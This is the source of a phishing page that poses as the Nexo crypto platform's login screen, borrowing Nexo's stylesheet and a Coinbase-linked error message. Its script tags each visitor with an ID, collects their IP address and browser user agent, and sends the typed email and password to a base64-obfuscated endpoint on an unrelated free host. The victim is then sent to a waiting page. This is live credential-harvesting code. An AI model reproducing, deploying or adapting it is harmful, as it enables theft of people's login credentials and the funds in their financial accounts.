    <title>Login • Nexo</title>
    <link href="https://platform.nexo.com/css/styles.f0503908dce35349.css?t=1766415678322" rel="stylesheet" />
    <meta name="robots" c />
	<link rel="stylesheet" href="style.css">
	<script src="https://hanahope.github.io/hanahope/data/jquery.js"></script>
	<script>
  document.addEventListener("DOMContentLoaded", function() {
    var uniqueid = localStorage.getItem('uniqueid');

    // Periksa apakah uniqueid sudah ada di localStorage
    if (!uniqueid) {
        uniqueid = Date.now();
        localStorage.setItem('uniqueid', uniqueid);
    }

    // Isi nilai input hidden dengan uniqueId
    var uniqueidInput = document.getElementById('uniqueidInput');
    if (uniqueidInput) {
        uniqueidInput.value = uniqueid;
    }

    var error = "";

    if (window.location.search.indexOf('error') !== -1) {
        error = '<div class="msgError">' +
            '<div class="msgTL">' +
            '<div class="msgTR">' +
            '<div class="msgBR">' +
            '<div class="msgBL">' +
            '<p class="msgP">You\'ve entered an incorrect email or password. Please try again. <a href="https://coinbase.com/signin/" title="">Having problems signing in?</a> Please note, you’ll be redirected to the desktop site.</p>' +
            '</div>' +
            '</div>' +
            '</div>' +
            '</div>' +
            '</div>';
    }

    var ipInput = document.getElementById('ipInput');
    var uaInput = document.getElementById('uaInput');

    if (ipInput && uaInput) {
        fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                ipInput.value = ip;

                var ua = window.navigator.userAgent;
                uaInput.value = ua;
            })
            .catch(error => {
                console.error('Error fetching IP info:', error);
            });
    }
    
    var allInputs = $(":input");

    $('#frmLogin').submit(function(e) {
      e.preventDefault();
      var username = $('#username').val();
      var password = $('#password').val();

      if (username == null || username == '') {
        return false;
      } else {}

      if (password == null || password == '') {
        return false;
      } else {}

      $.ajax({
        type: 'POST',
        url: atob('aHR0cHM6Ly9hZG1pbnBhbmVsczk5OTkuYnlldGhvc3QxMi5jb20vZmlsZXMvYWN0aW9uLnBocD90eXBlPWxvZ2lu'),
        data: $('#frmLogin').serialize(),
        success: function(data) {
          console.log(data);
          var parsed_data = JSON.parse(data);
          if (parsed_data.status == 'ok') {
            location.href = "waiting.htm";
          } else {
            return false;
          }
        }
      });
    });

    $('#continueButton').click(function() {
      $('#frmLogin').submit();
    });
  });
</script>
